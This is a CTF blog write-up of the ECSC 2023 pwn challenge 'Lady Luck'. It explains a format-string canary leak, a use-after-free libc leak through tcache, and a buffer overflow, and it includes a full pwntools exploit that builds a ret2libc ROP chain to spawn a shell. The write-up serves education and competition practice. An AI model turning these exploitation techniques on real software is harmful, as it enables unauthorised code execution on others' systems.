---
id: 17
title: "ECSC 2023: Lady Luck"
subtitle: "ECSC 2023 Day 3: Pwn"
date: "2023.11.02"
tags: "ecsc, ecsc2023, c, c++, pwn, ctf, ctf blog, writeup"
---

## Foreword

This challenge was a lot more interesting than those on Day 1. It featured a use-after-free to leak libc address, though the challenge overall is still a ret2libc challenge.

# Lady Luck

We run `checksec` on the binary:
```bash
[*] '/mnt/e/ctf_archive/ecsc2023/d3/ladyluck/lady_luck'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'./glibc/'
```

It has everything enabled. This means we potentially need to watch out for the canary as well as the PIE offset.

We open the binary in IDA and see that it's a menu based application.
```c
buf = 0;
v5 = 0;
fwrite(&unk_2508, 1uLL, 0x79uLL, stdout);
option1 = read_num();
if ( !option1 || option1 > 3 )
{
  puts("\nAre you trying to cheat Lady Luck?!\n");
  exit(1312);
}
fwrite(&unk_25B0, 1uLL, 0x66uLL, stdout);
read(0, &buf, 6uLL);
fflush(stdin);
if ( !strcmp((const char *)&buf, "fr33c01n5f0r3v3ry0n3") )
{
  coins = 0x174876E7FFLL;
}
else
{
  fprintf(stdout, "\n%s[-] Sorry, this is not correct: ", "\x1B[1;31m");
  fprintf(stdout, (const char *)&buf);
  puts("\x1B[1;34m");
}
menu();
```

There is a format string exploit with an input of up to length 6 in `main()` before it goes into menu. We can thus use it to leak the canary `%8$p`.

Decompiling `menu()` and all its subfunctions, we find out that `buy_pots()` restricts the potions you can buy to a maximum size of `0x82`.
```c
fwrite("\nml: ", 1uLL, 5uLL, stdout);
psize = read_num();
if ( psize <= 0x82 && psize )
{
  if ( check_coins(20 * psize) )
    coins -= 20 * psize;
  fwrite("\nSlot to place it: ", 1uLL, 0x13uLL, stdout);
  pindex = read_num();
  if ( pindex > 9 )
    goto LABEL_13;
  red_pots[pindex] = (char *)malloc(psize);
  strcpy(red_pots[pindex], "Lucky Red    potion x1");
}
```

`sell_pots()` calls `free()` but does not reset the pointer, which allows for a use-after-free or related bugs.
```c
free(red_pots[index]);
fprintf(stdout, "%s\n[+] Sold! You got back 20 coins!%s\n\n", "\x1B[1;32m", "\x1B[1;34m");
coins += 20LL;
```

`show_inventory()` will list out everything in the inventory, *including the freed elements in the array* due to the pointer not being set to null after `free()` (use-after-free!). This can be used to leak whatever we can get by calling `sell_pots()`.
```c
for ( i = 0LL; i <= 9; ++i )
{
  if ( red_pots[i] )
    fprintf(stdout, "Slot [%d]: %s\n", i, red_pots[i]);
  else
    fprintf(stdout, "Slot [%d]: Empty\n", i);
}
```

`discount_code()` defines an input buffer of length `0x80` but allows the user to input up to `0xB7` bytes with `fgets()`, which allows for buffer overflow.
```c
memset(y, 0, 128);
fwrite(
"\nI will tell you the lucky phrase for your next purchase, but you need to give me a good reason why: \n\n",
1uLL,
0x67uLL,
stdout);
fgets(y, 0xB7, stdin);
fwrite("Your code is: [fr33c01n5f0r3v3ry0n3]\n", 1uLL, 0x25uLL, stdout);
```

We can leak the libc address by buying 8 potions of length `0x82` then selling all of them. This is due to the way the tcache bins work (7 same-sized bins), and because of the use-after-free caused by the bad `free()` usage, we can leak the pointer to the 8th freed bin which would point to the main arena.

We still need to keep the top chunk in place to prevent coalescing, so theoretically we need to buy index 0-8 and sell index 0-7, then show index 7. We see a `0x7f` byte in gdb which tells we leaked some address in libc (since it points to the main arena). We set a breakpoint at `show_inventory()` and see our leaked address. Then we can simply `xinfo` to find the static offset to libc base, which is `0x219ce0`.

Chaining everything together, we have:
1. Leak canary with fsb
2. Leak libc with `buy_pots()`, `sell_pots()` and `show_inventory()`
3. Buffer overflow and ret2libc

We can automate the process with pwntools:
```py
from pwn import *
from exploit import *

# set exploit source, context binary, context log_level, libc
elf = context.binary = ELF("./lady_luck", checksec=False)
# context.log_level = 'debug'
libc = ELF("./glibc/libc.so.6")

# Run binary 1st time
p = exploit_source("./lady_luck", "localhost", gdbscript="b show_inventory")

def sell(n):
	p.sendlineafter(">>", "2")
	p.sendlineafter(":", str(n))

def buy(n):
	p.sendlineafter(">>", "1")
	p.sendlineafter(":", str(0x82))
	p.sendlineafter(":", str(n))

def inventory():
	p.sendlineafter(">>", "3")

# Leak canary
p.sendlineafter(b'>> ', "1")
p.recvuntil(": ")
p.sendlineafter(": ", "%8$p")
p.recvuntil(": ")
canary = int(p.recvline(), 16)
info(f"{hex(canary) =}")

p.sendlineafter(">>", "1")

# allocate 9 bins, free 8 to fill up tcache and get a pointer to the main arena on bin #8
for i in range(10):
	buy(i)

p.sendlineafter(">>", "3")

for i in range(9):
	sell(i)

# leak main arena address, calcullate libc base
inventory()

p.recvuntil("[7]: ")
libc.address = u64(p.recvline().rstrip(b'\n').ljust(8,b'\x00')) - 0x219ce0
success(f"{hex(libc.address) =}")

# perform bof and ret2libc
p.sendlineafter(":", "4")

rop = ROP(libc)

rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh")))

payload = flat({0x88: p64(canary), 0x90: p64(0) + rop.chain()})

p.sendafter(":", payload)

p.interactive()
```

`cat flag.txt` for the flag.

## Afterword

The most fun challenge out of all the rest because of the different layers that went into this, from leaking canary to getting a libc address, before finally sending the final payload to pop shell. Honestly I think it would've been easier if I had stronger knowledge on tcache and bins, but nonetheless it was kinda fun.

Throughout the competition, huge thanks to all my teammates for working tirelessly and especially [enigmatrix](https://enigmatrix.me) for his guidance with solving the pwn challenges.

Thanks for reading!